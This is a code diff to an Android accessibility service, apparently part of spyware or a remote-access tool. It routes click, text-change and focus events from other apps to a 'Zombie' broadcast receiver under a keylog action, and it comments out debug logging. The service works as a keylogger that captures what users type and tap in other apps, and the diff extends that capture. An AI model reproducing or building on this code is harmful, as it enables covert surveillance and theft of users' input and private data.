@@ -33,23 +33,27 @@ public class EyeAccessService extends AccessibilityService {
 		String className = event.getClassName().toString();
 		
 		if ( (eventType & AccessibilityEvent.TYPE_VIEW_CLICKED) == AccessibilityEvent.TYPE_VIEW_CLICKED ) {
-			NetLog.v("%s : Clicked on %s [%s]",packName,className,text);
+			Intent wakeup = new Intent();
+			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
+			wakeup.putExtra("event",event);
+			this.sendBroadcast(wakeup);
+			//NetLog.v("%s : Clicked on %s [%s]",packName,className,text);
 		} else if ( !isPassword && (eventType & AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ) {
 			Intent wakeup = new Intent();
 			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
-			wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_CHANGED);
+			//wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_CHANGED);
 			wakeup.putExtra("event",event);
 			this.sendBroadcast(wakeup);
-			NetLog.v("%s : Changed on %s [%s]",packName,className,text);
+			//NetLog.v("%s : Changed on %s [%s]",packName,className,text);
 		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_FOCUSED) == AccessibilityEvent.TYPE_VIEW_FOCUSED ) {
-			NetLog.v("%s : Focused on %s [%s]",packName,className,text);
+			//NetLog.v("%s : Focused on %s [%s]",packName,className,text);
 			Intent wakeup = new Intent();
 			wakeup.setAction(Zombie_BroadcastReceiver.ACTION_KEYLOG);
-			wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_FOCUSED);
+			//wakeup.putExtra(Zombie_BroadcastReceiver.EXTRA_EVENT_TYPE,Zombie_BroadcastReceiver.EVENT_FOCUSED);
 			wakeup.putExtra("event",event);
 			this.sendBroadcast(wakeup);
 		} else 	if ( (eventType & AccessibilityEvent.TYPE_VIEW_SELECTED) == AccessibilityEvent.TYPE_VIEW_SELECTED ) {
-			NetLog.v("%s : Selected on %s [%s]",packName,className,text);
+			//NetLog.v("%s : Selected on %s [%s]",packName,className,text);
 		} else 	if ( (eventType & AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ) == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED ) {
 			try {
 				handleNotify(event);
